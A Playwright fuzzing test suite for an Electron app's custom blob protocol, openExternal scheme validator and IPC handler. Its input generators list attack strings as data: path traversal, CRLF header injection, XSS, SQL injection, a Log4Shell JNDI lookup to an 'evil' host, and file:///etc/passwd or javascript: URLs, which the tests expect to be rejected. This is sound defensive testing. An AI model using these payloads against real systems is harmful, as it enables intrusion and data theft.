// Copyright (c) Microsoft Corporation. All rights reserved.
// Licensed under the MIT License.

/**
 * v0.1.21+ — Targeted fuzzing harness for the post-security-fix surfaces.
 *
 * Goal: throw thousands of pathological inputs at the recently-changed
 * security boundaries and assert that the responses are well-formed,
 * bounded in time, and never leak unhandled exceptions or grant
 * accidental success for known-malicious patterns.
 *
 * What this is NOT:
 *   - A property-based test with shrinking (no fast-check dep yet).
 *     We just generate random inputs and aggregate failure counts.
 *   - A correctness oracle for handler logic. We only care that the
 *     handler returns a SAFE response — not whether the manifest
 *     actually exists or the export format is right.
 *
 * Pass criteria per iteration:
 *   1. Response within 5s (no hang)
 *   2. Status is a valid HTTP-style code (200-599)
 *   3. If status is 5xx, error message is NOT 'Unknown error'
 *      (that would mean an unhandled exception path)
 *   4. For known-malicious patterns (traversal, sentinel chars):
 *      status is 4xx, body mentions 'invalid' or similar
 *   5. For known-good alphanumeric: passes whitelist (4xx/5xx from
 *      downstream handler is OK; we just exclude the whitelist
 *      message 'invalid characters')
 *
 * Targets:
 *   - cfs-blob://export/{name}       (M2 whitelist + handler)
 *   - cfs-blob://audit-pack/{id}     (M2 whitelist + handler)
 *   - cfs-blob://{unknown}/{name}    (router default branch)
 *   - shell.openExternal             (H4 scheme validator)
 */
import { test, expect, _electron, type ElectronApplication } from '@playwright/test';
import path from 'node:path';
import { createRequire } from 'node:module';

const APP_ROOT = path.resolve(__dirname, '..');
const MAIN_ENTRY = path.join(APP_ROOT, 'dist', 'electron', 'main.js');
const requireFromApp = createRequire(path.join(APP_ROOT, 'package.json'));
const electronExecutablePath = requireFromApp('electron') as string;

let app: ElectronApplication;

// Tests run sequentially on one app instance for speed.
test.beforeAll(async () => {
  app = await _electron.launch({
    args: [MAIN_ENTRY],
    cwd: APP_ROOT,
    executablePath: electronExecutablePath,
    env: { ...process.env, NODE_ENV: 'production' },
  });
  await app.firstWindow().then((w) => w.waitForLoadState('domcontentloaded'));
});

test.afterAll(async () => {
  await app?.close();
});

// ──────────────────────────────────────────────────────────────
// Random input generators
// ──────────────────────────────────────────────────────────────

let __seed = 0xdeadbeef;
function rand(): number {
  // xorshift32, deterministic across test runs for reproducibility
  __seed ^= __seed << 13;
  __seed ^= __seed >>> 17;
  __seed ^= __seed << 5;
  return (__seed >>> 0) / 0xffffffff;
}

function randInt(max: number): number {
  return Math.floor(rand() * max);
}

/** Random byte as hex pair for percent-encoding. */
function randByte(): string {
  const n = randInt(256);
  return '%' + n.toString(16).padStart(2, '0');
}

/** Generates a single fuzzed path segment for cfs-blob URLs. */
function fuzzPathSegment(): string {
  const strategy = randInt(20);
  switch (strategy) {
    case 0: return '';                                    // empty
    case 1: return ' ';                                   // whitespace
    case 2: return '\u0000';                              // NUL
    case 3: return '..';                                  // traversal
    case 4: return '../..';                               // traversal nested
    case 5: return '%2E%2E%2F';                           // encoded ../
    case 6: return '....//....';                          // poisoned-null traversal
    case 7: return '\u202Eevil';                          // RTL override
    case 8: return 'a'.repeat(randInt(1000));             // long ASCII
    case 9: return Array.from({ length: 32 }, () => String.fromCharCode(randInt(128))).join('');
    case 10: return Array.from({ length: 16 }, randByte).join('');
    case 11: return 'valid-name_1.0';                     // known-good control
    case 12: return 'valid' + String.fromCharCode(randInt(31));  // ASCII control suffix
    case 13: return '\r\nSet-Cookie: pwned=1';            // CRLF header injection
    case 14: return '<script>alert(1)</script>';          // XSS payload
    case 15: return "'; DROP TABLE users;--";             // SQL
    case 16: return '${jndi:ldap://evil/}';               // Log4Shell
    case 17: return '\u0301'.repeat(randInt(50));         // combining diacritics
    case 18: return 'CON';                                // Windows reserved
    case 19: return Array.from({ length: 8 }, () => String.fromCharCode(0x10400 + randInt(50))).join('');  // surrogates
  }
  return '';
}

/**
 * Generates a fuzzed URL string for shell.openExternal scheme-validator testing.
 *
 * IMPORTANT: This generator NEVER emits a valid http(s) URL — calling
 * shell.openExternal with a real http(s) URL actually opens a browser
 * tab in the host OS. We only fuzz the REJECTION path (non-http(s)
 * schemes, malformed URLs, edge cases). The workflow spec covers
 * positive http(s) acceptance separately with a tiny fixed set.
 */
function fuzzUrlForOpenExternal(): string {
  const strategy = randInt(15);
  switch (strategy) {
    case 0: return 'file:///etc/passwd';
    case 1: return 'file://C:/Windows/System32/cmd.exe';
    case 2: return 'javascript:alert(1)';
    case 3: return 'data:text/html,<script>alert(1)</script>';
    case 4: return 'ftp://evil.example/';
    case 5: return 'ssh://evil@example.com';
    case 6: return 'about:blank';
    case 7: return '';
    case 8: return ' ';
    case 9: return 'mailto:user@example.com';
    case 10: return 'chrome://settings';
    case 11: return 'vbscript:msgbox(1)';
    case 12: return 'jar:file:///c:/example.jar!/x';
    case 13: return 'gopher://evil.example';
    case 14: return 'tel:+15555550100';
  }
  return '';
}

/** Pattern recognizer — true if input looks like it SHOULD be rejected by the M2 whitelist. */
function shouldBeRejectedByWhitelist(decoded: string): boolean {
  if (decoded === '') return true;
  if (decoded.length > 256) return true;
  if (!/^[A-Za-z0-9._-]+$/.test(decoded)) return true;
  return false;
}

// ──────────────────────────────────────────────────────────────
// Helpers to probe from main process via net.fetch
// ──────────────────────────────────────────────────────────────

async function probeBlob(url: string): Promise<{ status: number; body: string; ms: number }> {
  return app.evaluate(async ({ net }, u) => {
    const start = Date.now();
    try {
      const r = await net.fetch(u);
      const body = await r.text();
      return { status: r.status, body, ms: Date.now() - start };
    } catch (err) {
      return { status: -1, body: (err as Error).message, ms: Date.now() - start };
    }
  }, url);
}

async function probeOpenExternal(url: string): Promise<{ accepted: boolean; ms: number }> {
  // Issue from main via the same IPC handler the renderer uses. We
  // can't call `cfs.shell.openExternal` from main directly — it's a
  // renderer-side wrapper. But we can invoke the underlying handler
  // by emitting a synthetic IPC. Easier: drive via the renderer page.
  const win = await app.firstWindow();
  return win.evaluate(async (u) => {
    const start = Date.now();
    const cfs = (
      window as unknown as { cfs: { shell: { openExternal(url: string): Promise<unknown> } } }
    ).cfs;
    try {
      await cfs.shell.openExternal(u);
      return { accepted: true, ms: Date.now() - start };
    } catch {
      return { accepted: false, ms: Date.now() - start };
    }
  }, url);
}

// ──────────────────────────────────────────────────────────────
// Fuzz Suite 1 — cfs-blob://export/{name}
// ──────────────────────────────────────────────────────────────

test('FUZZ: cfs-blob://export — 1000 random path segments stay safe', async () => {
  // CI tolerance: the Windows runner can be 10-15x slower than a local
  // dev box, so the per-test timeout (default 30s) and the per-probe
  // slow-response threshold (5s) both need headroom. Locally this
  // test finishes in ~17s; on a busy Windows runner each iteration
  // averages ~250ms so 1,000 iterations needs ~4 minutes worst-case.
  test.setTimeout(300_000);
  const SLOW_PROBE_MS = process.env.CI ? 15_000 : 5_000;
  const ITER = 1000;
  __seed = 0xdeadbeef; // reset for reproducibility

  // Warmup: first request to the protocol handler pays a one-time
  // cost (~5s) for lazy module init of @configforge/core handlers.
  // Issue a throwaway probe so we measure steady-state behavior.
  await probeBlob('cfs-blob://export/warmup?format=yaml');

  const findings: {
    iteration: number;
    input: string;
    status: number;
    body: string;
    issue: string;
  }[] = [];

  for (let i = 0; i < ITER; i++) {
    const raw = fuzzPathSegment();
    // Percent-encode anything that would break URL parsing, but
    // leave path chars alone so the handler sees the raw bytes.
    const url = `cfs-blob://export/${encodeURIComponent(raw)}?format=yaml`;
    let result;
    try {
      result = await probeBlob(url);
    } catch (err) {
      findings.push({
        iteration: i,
        input: raw.slice(0, 80),
        status: -1,
        body: (err as Error).message,
        issue: 'probe threw',
      });
      continue;
    }

    // Hang check (slow probe threshold — see CI tolerance comment above)
    if (result.ms > SLOW_PROBE_MS) {
      findings.push({
        iteration: i,
        input: raw.slice(0, 80),
        status: result.status,
        body: result.body.slice(0, 200),
        issue: `slow response: ${result.ms}ms`,
      });
    }

    // Status sanity
    if (result.status === -1) {
      findings.push({
        iteration: i,
        input: raw.slice(0, 80),
        status: result.status,
        body: result.body.slice(0, 200),
        issue: 'net.fetch threw',
      });
      continue;
    }
    if (result.status < 200 || result.status > 599) {
      findings.push({
        iteration: i,
        input: raw.slice(0, 80),
        status: result.status,
        body: result.body.slice(0, 200),
        issue: 'status out of range',
      });
    }

    // No "Unknown error" leak — would indicate unhandled exception path
    if (result.body.includes('"error":"Unknown error"')) {
      findings.push({
        iteration: i,
        input: raw.slice(0, 80),
        status: result.status,
        body: result.body.slice(0, 200),
        issue: 'unhandled-exception leak',
      });
    }

    // Known-malicious inputs must be rejected
    if (shouldBeRejectedByWhitelist(raw)) {
      if (result.status >= 200 && result.status < 300) {
        findings.push({
          iteration: i,
          input: raw.slice(0, 80),
          status: result.status,
          body: result.body.slice(0, 200),
          issue: 'malicious input got 2xx',
        });
      }
    }
  }

  // Report aggregate
  console.log(`FUZZ:export — ${ITER} iterations, ${findings.length} findings`);
  if (findings.length > 0) {
    console.log(JSON.stringify(findings.slice(0, 10), null, 2));
  }
  expect(findings).toEqual([]);
});

// ──────────────────────────────────────────────────────────────
// Fuzz Suite 2 — cfs-blob://audit-pack/{id}
// ──────────────────────────────────────────────────────────────

test('FUZZ: cfs-blob://audit-pack — 1000 random ids stay safe', async () => {
  // See cfs-blob://export fuzz for the CI-tolerance rationale.
  test.setTimeout(300_000);
  const SLOW_PROBE_MS = process.env.CI ? 15_000 : 5_000;
  const ITER = 1000;
  __seed = 0xfeedface;

  // Warmup — same rationale as cfs-blob://export fuzz.
  await probeBlob('cfs-blob://audit-pack/warmup?format=pdf');

  const findings: { iteration: number; input: string; status: number; issue: string }[] = [];

  for (let i = 0; i < ITER; i++) {
    const raw = fuzzPathSegment();
    const url = `cfs-blob://audit-pack/${encodeURIComponent(raw)}?format=pdf`;
    const result = await probeBlob(url);

    if (result.status === -1) {
      findings.push({ iteration: i, input: raw.slice(0, 80), status: -1, issue: 'net.fetch threw' });
      continue;
    }
    if (result.body.includes('"error":"Unknown error"')) {
      findings.push({
        iteration: i,
        input: raw.slice(0, 80),
        status: result.status,
        issue: 'unhandled-exception leak',
      });
    }
    if (result.ms > SLOW_PROBE_MS) {
      findings.push({
        iteration: i,
        input: raw.slice(0, 80),
        status: result.status,
        issue: `slow: ${result.ms}ms`,
      });
    }
    if (shouldBeRejectedByWhitelist(raw) && result.status >= 200 && result.status < 300) {
      findings.push({
        iteration: i,
        input: raw.slice(0, 80),
        status: result.status,
        issue: 'malicious input got 2xx',
      });
    }
  }

  console.log(`FUZZ:audit-pack — ${ITER} iterations, ${findings.length} findings`);
  if (findings.length > 0) {
    console.log(JSON.stringify(findings.slice(0, 10), null, 2));
  }
  expect(findings).toEqual([]);
});

// ──────────────────────────────────────────────────────────────
// Fuzz Suite 3 — cfs-blob://{unknown-route}
// ──────────────────────────────────────────────────────────────

test('FUZZ: cfs-blob unknown route returns 404 consistently', async () => {
  const ITER = 200;
  __seed = 0xcafebabe;

  const findings: { iteration: number; route: string; status: number; issue: string }[] = [];

  for (let i = 0; i < ITER; i++) {
    const route = encodeURIComponent(fuzzPathSegment()) || 'x';
    const url = `cfs-blob://${route}/anything`;
    let result;
    try {
      result = await probeBlob(url);
    } catch {
      // URL parse failures at net.fetch are OK — the URL was malformed before hitting handler.
      continue;
    }
    if (result.body.includes('"error":"Unknown error"')) {
      findings.push({
        iteration: i,
        route: route.slice(0, 80),
        status: result.status,
        issue: 'unhandled-exception leak in router',
      });
    }
  }

  console.log(`FUZZ:unknown-route — ${ITER} iterations, ${findings.length} findings`);
  if (findings.length > 0) {
    console.log(JSON.stringify(findings, null, 2));
  }
  expect(findings).toEqual([]);
});

// ──────────────────────────────────────────────────────────────
// Fuzz Suite 4 — shell.openExternal scheme validator (H4)
// ──────────────────────────────────────────────────────────────

test('FUZZ: shell.openExternal — 300 non-http(s) URLs are ALL rejected', async () => {
  // We deliberately never emit http(s) URLs from fuzzUrlForOpenExternal
  // because calling openExternal with a valid http(s) URL would open
  // a real browser tab on the host. So every iteration here MUST be
  // rejected by the H4 scheme validator — accepting any input is a
  // finding.
  const ITER = 300;
  __seed = 0xbaadf00d;

  const findings: { iteration: number; input: string; accepted: boolean; issue: string }[] = [];

  for (let i = 0; i < ITER; i++) {
    const u = fuzzUrlForOpenExternal();
    const result = await probeOpenExternal(u);

    if (result.accepted) {
      findings.push({
        iteration: i,
        input: u.slice(0, 80),
        accepted: result.accepted,
        issue: 'non-http(s) scheme was accepted',
      });
    }
    if (result.ms > 5000) {
      findings.push({
        iteration: i,
        input: u.slice(0, 80),
        accepted: result.accepted,
        issue: `slow: ${result.ms}ms`,
      });
    }
  }

  console.log(`FUZZ:openExternal — ${ITER} iterations, ${findings.length} findings`);
  if (findings.length > 0) {
    console.log(JSON.stringify(findings, null, 2));
  }
  expect(findings).toEqual([]);
});

// ──────────────────────────────────────────────────────────────
// Fuzz Suite 5 — IPC handler robustness: cfs.manifests.get
// ──────────────────────────────────────────────────────────────

test('FUZZ: cfs.manifests.get — 500 random names handled cleanly', async () => {
  const ITER = 500;
  __seed = 0xb16b00b5;

  const win = await app.firstWindow();

  const findings: { iteration: number; input: string; issue: string }[] = [];

  for (let i = 0; i < ITER; i++) {
    const name = fuzzPathSegment();
    const result = await win.evaluate(async (n) => {
      const start = Date.now();
      const cfs = (
        window as unknown as {
          cfs: { manifests: { get(name: string): Promise<unknown> } };
        }
      ).cfs;
      try {
        const data = await cfs.manifests.get(n);
        return { ok: true, data, ms: Date.now() - start };
      } catch (err) {
        return { ok: false, message: (err as Error).message, ms: Date.now() - start };
      }
    }, name);

    if (result.ms > 5000) {
      findings.push({ iteration: i, input: name.slice(0, 80), issue: `slow: ${result.ms}ms` });
    }
    // If it threw, the message must be a real one, not "undefined" / empty
    if (!result.ok && (!result.message || result.message === 'undefined')) {
      findings.push({
        iteration: i,
        input: name.slice(0, 80),
        issue: 'error with no message (unhandled)',
      });
    }
  }

  console.log(`FUZZ:manifests.get — ${ITER} iterations, ${findings.length} findings`);
  if (findings.length > 0) {
    console.log(JSON.stringify(findings, null, 2));
  }
  expect(findings).toEqual([]);
});
